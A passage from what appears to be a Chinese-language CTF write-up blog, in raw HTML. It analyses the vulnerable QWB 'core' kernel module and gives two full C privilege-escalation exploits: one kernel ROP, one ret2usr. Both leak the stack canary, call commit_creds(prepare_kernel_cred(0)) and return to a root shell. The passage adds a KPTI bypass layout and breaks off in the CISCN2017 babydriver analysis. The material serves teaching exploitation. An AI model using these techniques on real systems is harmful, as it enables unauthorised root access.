class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( (_DWORD)a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3, a2);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE, <span class="number">438LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-write"><a href="#core-write" class="headerlink" title="core_write"></a>core_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B, a2);</span><br><span class="line">  printk(&amp;unk_275, off);</span><br><span class="line">  v3 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v6[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v3[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v3, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见<code>ictol</code>函数是用户与内核进行交互的函数，功能有：</p><ul><li>调用<code>core_read</code>函数</li><li>设置<code>off</code>参数的值</li><li>调用<code>core_copy_func</code>函数</li></ul><p>可以看到<code>core_read</code>函数中调用了<code>copy_to_user(a1, &amp;v6[off], 64LL);</code> 即将内核中的<code>v6[off]</code>中复制<code>64</code>字节到用户的<code>a1</code>中。由于<code>off</code>是我们可控的，而且程序也没有对<code>off</code>的合法性进行判断，所以我们可以将<code>canary</code>和地址等各种敏感信息泄露出来<br>在<code>core_copy_func</code>函数中有这么一段调用：<code>qmemcpy(v3, &amp;name, (unsigned __int16)a1);</code> <code>a1</code>存在类型转换，存在整数溢出漏洞，我们因此可以将在<code>name</code>中写入<code>rop</code>链，然后<code>copy</code>到<code>v3</code>中，实现控制<code>rip</code><br>而<code>name</code>的值可以在<code>core_write</code>中进行修改<br>所以我们的利用思路就很明显了，修改<code>off</code>-&gt;泄露地址-&gt;<code>name</code>中写<code>rop</code>链-&gt;整数溢出造成栈溢出执行<code>rop</code>链<br>这题有<code>kernel rop</code>和<code>ret2usr</code>两种打法</p><h3 id="kernel-rop"><a href="#kernel-rop" class="headerlink" title="kernel rop"></a>kernel rop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> vm_base = <span class="number">0xffffffff81000000</span>;  <span class="comment">// 这个可以直接用checksec查看</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>,<span class="number">64</span>);  <span class="comment">// 设置off为64</span></span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>,buf);  <span class="comment">//用于泄露canary和地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----- stack -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary -&gt; 0x%lx\n&quot;</span>,canary);</span><br><span class="line">    <span class="type">size_t</span> code_base = buf[<span class="number">2</span>]<span class="number">-0x19b</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;code_base -&gt; 0x%lx\n&quot;</span>,code_base);</span><br><span class="line">    <span class="type">size_t</span> stack_base = code_base+<span class="number">0x2400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_base -&gt; 0x%lx\n&quot;</span>,stack_base);</span><br><span class="line"></span><br><span class="line">    vm_base = buf[<span class="number">4</span>] - <span class="number">0x1dd6d1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vm_base -&gt; 0x%lx\n&quot;</span>,vm_base);</span><br><span class="line">    <span class="type">size_t</span> swapgs = vm_base + <span class="number">0xa012da</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = vm_base + <span class="number">0x50ac2</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = vm_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = vm_base + <span class="number">0x9cce0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi = vm_base + <span class="number">0xb2f</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdx = vm_base + <span class="number">0xa0f49</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_call_rdx = vm_base + <span class="number">0x1aa6a</span>;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">8</span>] = canary;</span><br><span class="line">    rop[<span class="number">9</span>] = buf[<span class="number">1</span>]; <span class="comment">// old rbp</span></span><br><span class="line">    rop[<span class="number">10</span>] = pop_rdi;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">12</span>] = prepare_kernel_cred;</span><br><span class="line">    rop[<span class="number">13</span>] = pop_rdx;</span><br><span class="line">    rop[<span class="number">14</span>] = pop_rdx;</span><br><span class="line">    rop[<span class="number">15</span>] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[<span class="number">16</span>] = commit_creds;</span><br><span class="line">    rop[<span class="number">17</span>] = swapgs;</span><br><span class="line">    rop[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">19</span>] = iretq;  <span class="comment">// 切换至用户</span></span><br><span class="line">    rop[<span class="number">20</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    rop[<span class="number">21</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">22</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">23</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">24</span>] = user_ss;</span><br><span class="line">    write(<span class="number">0</span>,<span class="string">&quot;test!&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    write(fd,rop,<span class="number">0xd0</span>);  <span class="comment">// 将rop链写进name全局变量内</span></span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffff000000d0</span>);  <span class="comment">// 将name中的rop链复制到v3中，覆盖ret来控制rip</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> c_c;</span><br><span class="line"><span class="type">size_t</span> p_k_c;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = p_k_c;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = c_c;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> vm_base = <span class="number">0xffffffff81000000</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>,<span class="number">64</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>,buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----- stack -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary -&gt; 0x%lx\n&quot;</span>,canary);</span><br><span class="line"></span><br><span class="line">    vm_base = buf[<span class="number">4</span>] - <span class="number">0x1dd6d1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vm_base -&gt; 0x%lx\n&quot;</span>,vm_base);</span><br><span class="line">    <span class="type">size_t</span> swapgs = vm_base + <span class="number">0xa012da</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = vm_base + <span class="number">0x50ac2</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = vm_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = vm_base + <span class="number">0x9cce0</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = vm_base + <span class="number">0xb2f</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rax_rdi = vm_base + <span class="number">0x52d8d</span>;</span><br><span class="line"></span><br><span class="line">    c_c = commit_creds;</span><br><span class="line">    p_k_c = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">8</span>] = canary; </span><br><span class="line">    rop[<span class="number">9</span>] = buf[<span class="number">1</span>];  <span class="comment">// old rbp</span></span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="type">size_t</span>)getRoot;  <span class="comment">// ret2usr 内核执行用户空间的函数</span></span><br><span class="line">    rop[<span class="number">11</span>] = swapgs;  <span class="comment">// 恢复现场</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = iretq;  <span class="comment">// 切换至用户</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">    write(<span class="number">0</span>,<span class="string">&quot;test!&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    write(fd,rop,<span class="number">0xc0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffff000000c0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该打法就不做解释了，网上很多文章有讲，<code>ret2usr</code>就是用户态不能访问内核态的东西（对于没有<code>SMAP/SMEP</code>的情况下把内核指针重定向到用户空间的利用方式称为<code>ret2usr</code>），但是内核态可以访问用户态的东西，所以就可以利用内核的漏洞，在内核态中调用用户态的程序(函数或<code>shellcode</code>)。但这种方法在今天是很有局限性的，因为会有一种叫<code>SMEP</code>的保护机制禁止内核态执行用户态的程序，但这道题没有开<code>SMEP</code></p><h3 id="若开启KPTI"><a href="#若开启KPTI" class="headerlink" title="若开启KPTI"></a>若开启KPTI</h3><p>当内核开启<code>KPTI</code>保护，我们就无法直接通过<code>swapgs</code>和<code>iretq</code>来直接实现内核向用户态的切换，但我们可以使用<code>swapgs_restore_regs_and_return_to_usermode</code>这一个函数，其具体栈布局可以为：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs<span class="built_in">_</span>restore<span class="built_in">_</span>regs<span class="built_in">_</span>and<span class="built_in">_</span>return<span class="built_in">_</span>to<span class="built_in">_</span>usermode</span><br><span class="line">0 // padding</span><br><span class="line">0 // padding</span><br><span class="line">(size<span class="built_in">_</span>t)getShell</span><br><span class="line">user<span class="built_in">_</span>cs</span><br><span class="line">user<span class="built_in">_</span>rflags</span><br><span class="line">user<span class="built_in">_</span>sp</span><br><span class="line">user<span class="built_in">_</span>ss</span><br></pre></td></tr></table></figure><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 babydriver"></a>CISCN2017 babydriver</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v3</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v1 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v2 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = device_create(v3, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>);</span><br><span 